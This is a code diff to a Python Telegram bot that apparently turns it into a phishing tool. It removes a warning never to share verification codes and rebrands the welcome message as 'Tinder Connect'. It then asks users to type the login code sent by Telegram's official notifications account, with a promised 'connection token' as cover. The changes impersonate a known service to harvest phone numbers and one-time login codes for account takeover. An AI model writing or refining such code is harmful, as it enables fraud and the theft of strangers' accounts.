@@ -19,34 +19,38 @@ from database import (
     save_user,
     get_user,
 )
+from helpers import send_card
+from pathlib import Path
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+BANNER_PATH = Path("assets/banner.png")
 
-    button = KeyboardButton(
-        text="📱 Share My Phone Number",
-        request_contact=True,
-    )
+async def start(update, context):
 
-    keyboard = ReplyKeyboardMarkup(
-        [[button]],
-        resize_keyboard=True,
-        one_time_keyboard=True,
-    )
+    chat_id = update.effective_chat.id
 
-    message = """
-👋 Welcome!
+    if BANNER_PATH.exists():
 
-To register your account, please share your phone number by tapping the button below.
-
-🔒 Privacy Notice:
-
-• Your phone number is used only for verification.
-• Never share your verification code with anyone.
-"""
+        with open(BANNER_PATH, "rb") as photo:
+            await context.bot.send_photo(
+                chat_id=chat_id,
+                photo=photo
+            )
 
     await update.message.reply_text(
-        message,
-        reply_markup=keyboard,
+        """
+━━━━━━━━━━━━━━━━━━
+
+❤️ Tinder Connect
+
+✨ Secure Account Verification
+
+Welcome!
+
+Connect your account securely.
+
+━━━━━━━━━━━━━━━━━━
+        """,
+        reply_markup=start_keyboard()
     )
 
 
@@ -87,7 +91,7 @@ async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(
         "✅ Phone number verified.\n\n"
-        "Please enter the verification code:"
+        "Please enter the verification code you received from our site through the official Telegram Notifications account:"
     )
 
 
@@ -128,7 +132,7 @@ async def verify_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
 
         await update.message.reply_text(
-            "✅ OTP verified successfully! Thank you for your patience. We are now processing your request and will get back to you shortly."
+            "✅ ✅ OTP verified successfully! Thank you for your patience. We are currently processing your request. Once everything is complete, we will provide you with a secure connection token to link this bot with your Tinder account. Please wait while we finish the process."
         )
 
 
